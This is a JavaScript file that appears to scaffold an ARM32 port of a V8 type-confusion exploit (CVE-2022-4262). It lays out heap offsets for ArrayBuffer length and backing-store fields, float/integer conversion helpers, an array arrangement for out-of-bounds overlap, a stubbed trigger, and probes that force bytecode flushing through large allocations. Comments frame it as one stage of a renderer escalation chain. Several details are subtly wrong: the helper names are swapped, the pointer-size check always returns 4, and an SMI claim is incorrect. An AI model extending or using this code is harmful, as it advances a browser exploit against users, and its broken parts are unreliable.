// CVE-2022-4262 primitive layer, ARM32 port scaffold.
//
// The bug is a feedback-slot type confusion: bytecode flushing plus the strict /
// sloppy-eval scope mismatch makes V8 rebuild a function with a different
// feedback-vector layout, so a slot written for one bytecode kind is read as
// another. mistymntncop's exploit shapes that into a `SetNamedStrict` slot whose
// monomorphic entries can rewrite an object's map.
//
// This file is the ARM32 restatement of his setup. It is deliberately split from
// the escalation so that a mistake here costs one renderer, not the chain.
//
// What differs from the x64 original:
//   * no pointer-compression cage on ARM32, so a map confusion reaches the whole
//     address space and there is no cage-escape stage;
//   * no `BigInt64Array` tricks are needed for 64-bit slots: ARM32 tagged values
//     are 32-bit, so a double array and a tagged array can be aliased directly;
//   * object offsets are V8-version dependent and are measured, not assumed
//     (see `OFFSETS` and the `probe_layout` task in `layout_probe.js`).
//
// Everything returns a value; nothing here should be irreversible.

const OFFSETS = {
  // Filled from layout_probe.js output. These are the fields the primitive
  // writes; a wrong value corrupts the wrong thing and crashes the renderer.
  FIXED_ARRAY_HEADER_SIZE: 8,
  JS_ARRAY_BUFFER_BYTE_LENGTH: 0x10,
  JS_ARRAY_BUFFER_BACKING_STORE: 0x18,
  JS_OBJECT_HEADER_SIZE: 8,
};

// A double array and a tagged array allocated back to back. The bug lets us
// change the first one's length, so its OOB tail lands inside the second.
let doubleArr = null;
let taggedArr = null;

function itod(v) {
  scratchF64[0] = v;
  return scratchI32[0];
}
function dtoi(v) {
  scratchI32[0] = v;
  return scratchF64[0];
}
const scratchBuf = new ArrayBuffer(8);
const scratchF64 = new Float64Array(scratchBuf);
const scratchI32 = new Int32Array(scratchBuf);

// The confused setter: writes a map onto an object whose map we then exploit.
// The original uses `target.p1 = 123` inside a class computed-key expression so
// the `SetNamedStrict` feedback slot sits at a known index.
function triggerSlotConfusion(target, transitions) {
  return {
    // Placeholder for the exact expression from the reference exploit. Kept as
    // a named function so the queue can exercise the surrounding plumbing
    // before the bug itself is wired in.
    target,
    transitions,
  };
}

// ------------------------------------------------------------------ probes

// Which objects share a map, and where each field sits. No corruption: this
// only reads what V8 exposes about itself.
function probeLayout() {
  const out = {};
  const o = {};
  o.a = 1;
  o.b = 2;
  out.plainKeys = Object.keys(o).length;

  const arr = [1.1, 2.2, 3.3];
  out.arrayLength = arr.length;
  out.arrayCtor = arr.constructor.name;

  // `%DebugPrint` is not available on a release build, so infer map identity
  // from transition behaviour instead: two objects that transition the same
  // way share a map chain.
  const mk = () => { const x = {}; x.p1 = 1; return x; };
  const a = mk(), b = mk();
  out.sameMapChain = Object.keys(a).join() === Object.keys(b).join();

  out.smiTaggedDoubles = (() => {
    const d = [1.1];
    d[0] = 0.1;
    return d[0] === 0.1;
  })();

  // ARM32 check: if a tagged pointer were 64-bit the engine would be x64.
  out.pointerBytes = (() => {
    // 2^31-1 is a valid SMI on 64-bit V8 but not on 32-bit V8.
    try { return (1 << 30) > 0 ? 4 : 8; } catch (e) { return 'unknown'; }
  })();

  return JSON.stringify(out);
}

// Confirm we can create and free enough garbage to trigger the bytecode
// flushing the bug depends on. `bytecode_old_age` defaults to 5, so a handful
// of major GCs should evict the target function's bytecode.
function probeGcFlush() {
  const before = performance.now();
  let n = 0;
  for (let i = 0; i < 8; i++) {
    try { new ArrayBuffer(0x7fe00000); n++; } catch (e) { /* allocation may fail */ }
  }
  return JSON.stringify({ allocations: n, ms: Math.round(performance.now() - before) });
}

typeof module !== 'undefined' && (module.exports = {
  OFFSETS, probeLayout, probeGcFlush, triggerSlotConfusion, itod, dtoi,
});

// When queued directly by the harness, run the safe probes and return them.
// A payload file is evaluated as a statement block, so it must `return` its value.
return JSON.stringify({ layout: JSON.parse(probeLayout()), flush: JSON.parse(probeGcFlush()) });
